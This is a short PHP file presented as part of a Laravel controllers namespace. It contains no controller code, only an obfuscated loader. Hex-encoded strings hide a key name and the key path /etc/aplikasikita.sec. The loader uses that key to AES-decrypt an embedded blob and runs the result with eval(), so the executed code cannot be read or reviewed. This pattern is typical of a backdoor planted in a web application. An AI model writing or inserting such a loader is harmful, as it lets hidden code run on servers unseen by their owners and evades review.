<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('5LoS0o5xUuYu7RVhUcc2Cw==');

$c=base64_decode(

'a2BYDcE4dABqFcLucfKxWS6v7ksIUeeEo3d5TOAOJqRpd+xgXTsf9913l9PAEwyfTmfu3QiPxorA' .
'x3n1J0L87Cqo/pgDAg0fgOp/Ym1VuQEt3VMm/QmUwp0Ljvojac12VgaAkhCuc+NE4uEM/wqZnXxO' .
'WJLfkbQ4H5atOerm6sqfbYOEVjTC2Ic0bVKwRNROk2yaLxjEzt3UQkUtxeg2tRjHC85c5fSqm9KU' .
'AZf7qOtaXpxw9IGZePJ9YPCgacqg'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

